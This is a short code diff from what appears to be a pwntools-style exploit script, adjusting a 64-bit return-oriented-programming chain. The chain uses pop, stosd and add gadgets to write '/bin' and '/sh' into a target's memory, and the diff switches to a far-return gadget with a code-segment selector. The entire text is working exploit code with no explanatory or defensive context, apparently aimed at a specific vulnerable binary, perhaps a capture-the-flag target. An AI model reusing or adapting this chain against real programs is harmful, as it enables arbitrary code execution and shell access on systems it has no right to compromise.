@@ -1,24 +1,24 @@
 payload = p64(0x4017d3)
 #0x00000000004017d3: pop rdi; ret; 
-payload += p64(0x4641a0)+p64(0x403b03)
+payload += p64(0x464187)+p64(0x403b03)
 # 0x0000000000403b03: pop rax; ret; 
-payload += p64(0x80)+p64(0x449734)
-# 0x0000000000449734: stosd dword ptr [rdi], eax; ret; 
-payload += p64(0x4017d3)
+payload += p64(0x80)+p64(0x42edc4)
+# 0x42edc4: stosd dword ptr [rdi], eax ; retf 2
+payload += p32(0x4017d3)+p32(0x33)+"\x00"*2
 # 0x00000000004017d3: pop rdi; ret; 
 payload += p64(0x464070)+p64(0x403b03)
 # 0x0000000000403b03: pop rax; ret; 
-payload += p64(0x6e69622f)+p64(0x449734)
-# 0x0000000000449734: stosd dword ptr [rdi], eax; ret; 
-payload += p64(0x4017d3)
+payload += p64(0x6e69622f)+p64(0x42edc4)
+# 0x42edc4: stosd dword ptr [rdi], eax ; retf 2
+payload += p32(0x4017d3)+p32(0x33)+"\x00"*2
 # 0x00000000004017d3: pop rdi; ret; 
 payload += p64(0x464074)+p64(0x403b03)
 # 0x0000000000403b03: pop rax; ret; 
-payload += p64(0x68662f)+p64(0x449734)
-# 0x0000000000449734: stosd dword ptr [rdi], eax; ret; 
-payload += p64(0x403b03)
+payload += p64(0x68662f)+p64(0x42edc4)
+# 0x42edc4: stosd dword ptr [rdi], eax ; retf 2
+payload += p32(0x403b03)+p32(0x33)+"\x00"*2
 # 0x0000000000403b03: pop rax; ret; 
-payload += p64(0x36b63fb5)+p64(0x401553)
+payload += p64(0x36b63f9c)+p64(0x401553)
 # 0x0000000000401553: add edx, dword ptr [rax - 0x366ffe15]; ret; 
 payload += p64(0x4017d3)
 # 0x00000000004017d3: pop rdi; ret; 
